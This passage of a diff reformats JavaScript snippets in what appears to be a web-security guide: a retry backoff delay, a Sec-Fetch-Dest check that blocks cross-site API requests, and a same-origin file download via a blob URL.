-    const delay = retryAfter ? retryAfter * 1000 : 2 ** i * 500 + Math.random() * 250;
+    const delay = retryAfter
+      ? retryAfter * 1000
+      : 2 ** i * 500 + Math.random() * 250;
     await new Promise((r) => setTimeout(r, delay));
   }
   throw new Error("Too many retries");
@@ -5185,7 +5320,11 @@ Since the iframe can't contain the user's private data on that site, the browser
 - **Endpoint-specific rules**: an image CDN can allow cross-site `image` requests while blocking everything else.
 
 ```js
-if (req.path.startsWith("/api/") && req.get("Sec-Fetch-Dest") && req.get("Sec-Fetch-Dest") !== "empty") {
+if (
+  req.path.startsWith("/api/") &&
+  req.get("Sec-Fetch-Dest") &&
+  req.get("Sec-Fetch-Dest") !== "empty"
+) {
   return res.status(403).end();
 }
 ```
@@ -5425,10 +5564,15 @@ Safer approaches:
 - If you fetch the file with JavaScript and create a blob, revoke the object URL afterwards and don't keep the data around.
 
 ```js
-const res = await fetch(`/api/documents/${id}/download`, { credentials: "same-origin" });
+const res = await fetch(`/api/documents/${id}/download`, {
+  credentials: "same-origin",
+});
 const blob = await res.blob();
 const url = URL.createObjectURL(blob);
-const a = Object.assign(document.createElement("a"), { href: url, download: "statement.pdf" });
+const a = Object.assign(document.createElement("a"), {
+  href: url,
+  download: "statement.pdf",
+});
 a.click();
 URL.revokeObjectURL(url);
 ```
